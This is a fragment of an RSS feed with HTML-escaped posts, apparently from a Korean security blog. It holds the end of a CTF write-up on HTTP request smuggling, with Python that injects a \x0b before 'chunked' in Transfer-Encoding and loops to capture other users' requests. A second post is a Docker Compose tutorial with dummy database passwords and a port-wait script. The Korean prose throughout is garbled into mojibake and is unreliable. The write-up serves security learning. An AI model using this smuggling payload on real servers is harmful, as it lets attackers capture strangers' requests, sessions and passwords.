&lt;span class=&quot;n&quot;&gt;smuggle_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'X-guid: 22099301-d68e-4dfb-996f-1626f3158b5e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;smuggle_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'Content-Length: '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;second_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;smuggle_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'Connection: keep-alive&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;smuggle_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'Transfer-Encoding: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x0b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;chunked&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;smuggle_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;smuggle_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'A&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;smuggle_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;smuggle_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;second_packet&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smuggle_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smuggle_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Transfer-Encoding í—¤ë”ì— chunked ì•ì— \x0bë¥¼ ì´ìš©í•˜ì—¬ HTTP Request Smuggling ì·¨ì•½ì ì„ ë°œí˜„ì‹œí‚µë‹ˆë‹¤. ì´í›„ second_packetìœ¼ë¡œ ì „ì†¡ë˜ëŠ” ë‚´ìš©ì´ ë°±ì—”ë“œ ì„œë²„ì˜ ë²„í¼ì— ë‚¨ì•„ ë‹¤ìŒ ìš”ì²­ê³¼ í•¨ê»˜ ì²˜ë¦¬ë˜ë¯€ë¡œ íƒ€ì¸ì´ ìš”ì²­í•œ íŒ¨í‚·ì´ X-guid í—¤ë”ë¡œ ì „ì†¡í•œ íŒŒì¼ë¡œ ì €ì¥ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/f21ac0a4-5c4f-4e26-aeb8-fdbac22da22e/d897eb4d-1e61-44f3-bd66-a400c73acc50.png&quot; alt=&quot;/assets/f21ac0a4-5c4f-4e26-aeb8-fdbac22da22e/d897eb4d-1e61-44f3-bd66-a400c73acc50.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;HTTP request smuggling ì·¨ì•½ì  íŠ¹ì„±ìƒ ë¶ˆíŠ¹ì • ë‹¤ìˆ˜ì—ê²Œ ë¬´ë¶„ë³„í•˜ê²Œ ë°œí˜„ë˜ë¯€ë¡œ ìœ„ ì½”ë“œë¥¼ ì‘ì„±í•˜ì—¬ ë°˜ë³µì ìœ¼ë¡œ ì›í•˜ëŠ” ê°’ì„ í™•ì¸í•  ë•Œê¹Œì§€ ë°˜ë³µí•©ë‹ˆë‹¤. ê·¸ ê³¼ì •ì—ì„œ íƒ€ì¸ì´ í˜ì´ì§€ì— ì ‘ê·¼í•œ ì •ìƒì ì¸ íŒ¨í‚·ë„ í™•ì¸í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ì—¬ëŸ¬ ë²ˆ ì‹œë„ í›„ì— ë´‡ì´ ì£¼ê¸°ì ìœ¼ë¡œ flagê°€ ë‹´ê¸´ íŒ¨í‚·ì„ ì „ì†¡í•˜ëŠ” ë¶€ë¶„ì„ ì €ì¥í•˜ì—¬ FLAGë¥¼ íšë“í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;í•´ë‹¹ ë¬¸ì œëŠ” uploooadit ì´ë¼ëŠ” ë¬¸ì œë¡œ ëŒ€íšŒ ì¢…ë£Œ í›„ &lt;a href=&quot;https://github.com/o-o-overflow/dc2020q-uploooadit&quot;&gt;https://github.com/o-o-overflow/dc2020q-uploooadit&lt;/a&gt;ì— ê³µê°œë˜ì–´ ìˆìœ¼ë¯€ë¡œ ì°¸ê³ í•˜ì‹œë©´ ì¢‹ì„ ê²ƒ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;6-ê·¸-ì™¸-ì•…ìš©-ê°€ëŠ¥-ì‹œë‚˜ë¦¬ì˜¤&quot;&gt;6. ê·¸ ì™¸ ì•…ìš© ê°€ëŠ¥ ì‹œë‚˜ë¦¬ì˜¤&lt;/h2&gt;

&lt;p&gt;HTTP Request Smugglingì„ ì´ìš©í•œ Paypal íŒ¨ìŠ¤ì›Œë“œ íƒˆì·¨ ì·¨ì•½ì ì„ ì œë³´í•˜ì—¬(&lt;a href=&quot;https://hackerone.com/reports/510152&quot;&gt;https://hackerone.com/reports/510152&lt;/a&gt;) $20,000ì˜ ë¦¬ì›Œë“œë¥¼ ë°›ì€ ì‚¬ë¡€ë„ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;7-ì°¸ê³ ìë£Œ&quot;&gt;7. ì°¸ê³ ìë£Œ&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn&quot;&gt;https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@knownsec404team/protocol-layer-attack-http-request-smuggling-cc654535b6f&quot;&gt;https://medium.com/@knownsec404team/protocol-layer-attack-http-request-smuggling-cc654535b6f&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://nathandavison.com/blog/haproxy-http-request-smuggling&quot;&gt;https://nathandavison.com/blog/haproxy-http-request-smuggling&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.hahwul.com/2019/08/http-smuggling-attack-re-born.html&quot;&gt;https://www.hahwul.com/2019/08/http-smuggling-attack-re-born.html&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/o-o-overflow/dc2020q-uploooadit&quot;&gt;https://github.com/o-o-overflow/dc2020q-uploooadit&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://hackerone.com/reports/488147&quot;&gt;https://hackerone.com/reports/488147&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://b.pungjoo.com/entry/HTTP-11-Keep-Alive-%EA%B8%B0%EB%8A%A5%EC%97%90-%EB%8C%80%ED%95%B4&quot;&gt;https://b.pungjoo.com/entry/HTTP-11-Keep-Alive-ê¸°ëŠ¥ì—-ëŒ€í•´&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://goodgid.github.io/HTTP-Keep-Alive/&quot;&gt;https://goodgid.github.io/HTTP-Keep-Alive/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jins-dev.tistory.com/entry/HTTP11-%EC%9D%98-HTTP-Pipelining-%EA%B3%BC-Persistent-Connection-%EC%97%90-%EB%8C%80%ED%95%98%EC%97%AC&quot;&gt;https://jins-dev.tistory.com/entry/HTTP11-ì˜-HTTP-Pipelining-ê³¼-Persistent-Connection-ì—-ëŒ€í•˜ì—¬&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/ko/docs/Web/HTTP/Connection_management_in_HTTP_1.x&quot;&gt;https://developer.mozilla.org/ko/docs/Web/HTTP/Connection_management_in_HTTP_1.x&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://sunghwanjo.tistory.com/entry/Chunked-Response%EB%9E%80&quot;&gt;https://sunghwanjo.tistory.com/entry/Chunked-Responseë€&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Transfer-Encoding&quot;&gt;https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Transfer-Encoding&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Fri, 01 May 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-05-01/HTTP-Request-Smuggling-HTTP-Desync-Attack-be0e1c6035f84533af79463b3ec49d75</link>
        <guid isPermaLink="true">http://localhost:4000/2020-05-01/HTTP-Request-Smuggling-HTTP-Desync-Attack-be0e1c6035f84533af79463b3ec49d75</guid>
        
        <category>web</category>
        
        
      </item>
    
      <item>
        <title>Dockerfile, Docker-Compose Project</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ìœ ì„ ë™&lt;/p&gt;

&lt;h2 id=&quot;introduce&quot;&gt;[Introduce]&lt;/h2&gt;

&lt;p&gt;Docker-Composeë¥¼ ì‚¬ìš©í•˜ì—¬ ì—¬ëŸ¬ ë„ì»¤ ì»¨í…Œì´ë„ˆë¥¼ í†µí•´ í™˜ê²½ì„ êµ¬ì¶•ì‹œ ì»¨í…Œì´ë„ˆ í”„ë¡œì„¸ìŠ¤ ì¶©ëŒë¡œ ì¸í•˜ì—¬ ì •ìƒ êµ¬ë™ì´ ë˜ì§€ ì•Šì•„ ì¶©ëŒ ë¬¸ì œ ê´€ë ¨ ì—°êµ¬ë¥¼ í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;dockerfile-ìµœì í™”-ë°-docker-container-ì¶©ëŒ-ë¬¸ì œ-ì—°êµ¬&quot;&gt;[Dockerfile ìµœì í™” ë° Docker Container ì¶©ëŒ ë¬¸ì œ ì—°êµ¬]&lt;/h3&gt;

&lt;div class=&quot;language-docker highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;version: &quot;3.5&quot;

services:
    apache_web:
        image: apache_web
        container_name: apache_web
        restart: always
        depends_on:
            - mysql_db
        links: 
            - mysql_db:mysql_db
        build:
            context: ./apache_web
            dockerfile: Dockerfile
        networks:
            - pentest
        ports: 
            - &quot;127.0.0.1:1127:80&quot;

    mysql_db:
        image: mysql_db
        container_name: mysql_db
        restart: always
        build:
            context: ./mysql_db
            dockerfile: Dockerfile
        environment:
            - MYSQL_ROOT_PASSWORD=@@D@ngD@ngE!
            - MYSQL_DATABASE=db_test
            - MYSQL_USER=DongDongE
            - MYSQL_PASSWORD=D@ngD@ngE
        networks:
            - pentest
        

    flask_web:
        image: flask_web
        container_name: flask_web
        restart: always
        depends_on:
            - mysql_db
            - apache_web
        links: 
            - apache_web:apache_web
        build:
            context: ./apache_web
            dockerfile: Dockerfile
        networks:
            - pentest

    bots:
        image: bots
        container_name: bots
        restart: always
        depends_on:
            - apache_web
            - mysql_db
            - flask_web
        links: 
            - apache_web:apache_web
        build:
            context: ./bots
            dockerfile: Dockerfile
        networks:
            - pentest

networks:
    pentest:
        driver: bridge
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Docker-compose.yml - (ë‚´ë¶€ ì†ì„±ì€ ë”ë¯¸ ì‚¬ìš©)&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;image&lt;/code&gt; : ìƒì„±ë  ì´ë¯¸ì§€ ì´ë¦„ &lt;strong&gt;ë˜ëŠ”&lt;/strong&gt; ì‚¬ìš©ë  ì´ë¯¸ì§€&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;container_name&lt;/code&gt; : ìƒì„±ë  ì»¨í…Œì´ë„ˆ ì´ë¦„&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;restart: always&lt;/code&gt; : ì»¨í…Œì´ë„ˆ ì¤‘ë‹¨ì‹œ ìë™ìœ¼ë¡œ ì¬ì‹œì‘&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;environment&lt;/code&gt; : í•´ë‹¹ ì»¨í…Œì´ë„ˆì— í™˜ê²½ë³€ìˆ˜ ì„¤ì •&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;depends_on&lt;/code&gt; :  ê¸°ì…ëœ í•´ë‹¹ ì»¨í…Œì´ë„ˆ ë¶€í„° ë¶€íŒ…&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;networks&lt;/code&gt; : ë„¤íŠ¸ì›Œí¬ ìƒì„±&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ports :  &quot;127.0.0.1:1127:80&quot;&lt;/code&gt; : ì»¨í…Œì´ë„ˆë¡œ í¬íŠ¸ í¬ì›Œë”© (127.0.0.1ì¼ ê²½ìš° ë¡œì»¬ì—ì„œë§Œ ì ‘ê·¼ ê°€ëŠ¥)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ìœ„ ì˜µì…˜ì„ í† ëŒ€ë¡œ â€œ&lt;strong&gt;networks&lt;/strong&gt;â€œë¥¼ ì‚¬ìš©í•˜ì—¬ Docker-Compose.ymlì— ë¬¶ì—¬ ìˆëŠ” ì»¨í…Œì´ë„ˆë§ˆë‹¤ í•˜ë‚˜ì˜ ë§ì„ ì œê³µ(ê°ê° ê¸°ê´€ë§ˆë‹¤ ë§ì„ ë¶„ë¦¬í•˜ê¸° ìœ„í•´) í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë„ì»¤ ì»¨í…Œì´ë„ˆê°€ í”„ë¡œì„¸ìŠ¤(MySQL, Apache)ê°€ ë¹„ì •ìƒì ìœ¼ë¡œ ì¢…ë£Œì‹œ ê°„í˜¹ ì»¨í…Œì´ë„ˆë„ ì£½ëŠ” í˜„ìƒì´ ìˆì–´ ì»¨í…Œì´ë„ˆê°€ êº¼ì§ˆì‹œ ìë™ìœ¼ë¡œ ì¼œì£¼ê¸° ìœ„í•´ â€œ&lt;strong&gt;restart: always&lt;/strong&gt;â€œë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë˜í•œ ì»¨í…Œì´ë„ˆ ë¶€íŒ… ìˆœì„œë¥¼ &lt;code class=&quot;highlighter-rouge&quot;&gt;DB&lt;/code&gt; â†’ &lt;code class=&quot;highlighter-rouge&quot;&gt;Web&lt;/code&gt; â†’ &lt;code class=&quot;highlighter-rouge&quot;&gt;Flask&lt;/code&gt; â†’ &lt;code class=&quot;highlighter-rouge&quot;&gt;Bot&lt;/code&gt; ìˆœì„œë¡œ ë¶€íŒ… ë˜ì–´ì•¼ ì—ëŸ¬ê°€ ë°œìƒí•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ë„ì»¤ ì—ì„œëŠ” ì»¨í…Œì´ë„ˆë¥¼ ìš°ì„ ìˆœìœ„ ì§€ì •ì„ â€œ&lt;strong&gt;depends_on&lt;/strong&gt;â€ ë¡œ ì§€ì •í•  ìˆ˜ ìˆì§€ë§Œ ì»¨í…Œì´ë„ˆê°€ ë¶€íŒ… ë˜ê³  í•´ë‹¹ í”„ë¡œì„¸ìŠ¤ë„ ì •ìƒì ìœ¼ë¡œ ì˜¬ë¼ê°”ëŠ”ì§€ëŠ” ê²€ì‚¬í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.  í•´ë‹¹ ë¬¸ì œë¥¼ í•´ê²° í•˜ê¸° ìœ„í•´ ì•„ë˜ â€œ&lt;strong&gt;wait-for&lt;/strong&gt;â€ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš© í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;[Wait-for-it.sh]&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env bash&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Use this script to test if a given TCP host/port are available&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;WAITFORIT_cmdname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;##*/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;

echoerr&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_QUIET&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; 1 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 1&amp;gt;&amp;amp;2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

usage&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;USAGE&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; &amp;gt;&amp;amp;2
Usage:
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_cmdname&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; host:port [-s] [-t timeout] [-- command args]
    -h HOST | --host=HOST       Host or IP under test
    -p PORT | --port=PORT       TCP port under test
                                Alternatively, you specify the host and port as host:port
    -s | --strict               Only execute subcommand if the test succeeds
    -q | --quiet                Don't output any status messages
    -t TIMEOUT | --timeout=TIMEOUT
                                Timeout in seconds, zero for no timeout
    -- COMMAND ARGS             Execute command with args after the test finishes
&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;USAGE
&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

wait_for&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_TIMEOUT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-gt&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
        &lt;/span&gt;echoerr &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_cmdname&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: waiting &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_TIMEOUT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; seconds for &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_HOST&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_PORT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else
        &lt;/span&gt;echoerr &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_cmdname&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: waiting for &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_HOST&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_PORT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; without a timeout&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;fi
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAITFORIT_start_ts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt; +%s&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; :
    &lt;span class=&quot;k&quot;&gt;do
        if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_ISBUSY&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 1 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
            &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_HOST&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_PORT&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;WAITFORIT_result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/tcp/&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_HOST&lt;/span&gt;/&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null 2&amp;gt;&amp;amp;1
            &lt;span class=&quot;nv&quot;&gt;WAITFORIT_result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;fi
        if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_result&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
            &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WAITFORIT_end_ts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt; +%s&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
            echoerr &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_cmdname&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_HOST&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WAITFORIT_PORT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; is available after &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$((&lt;/span&gt;WAITFORIT_end_ts &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; WAITFORIT_start_ts&lt;span class=&quot;k&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; seconds&quot;&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;break
        &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi
        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1
    &lt;span class=&quot;k&quot;&gt;done
    return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$WAITFORIT_result&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

wait_for_wrapper&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# In order to support SIGINT during timeout: http://unix.stackexchange.com/a/57692&lt;/span&gt;
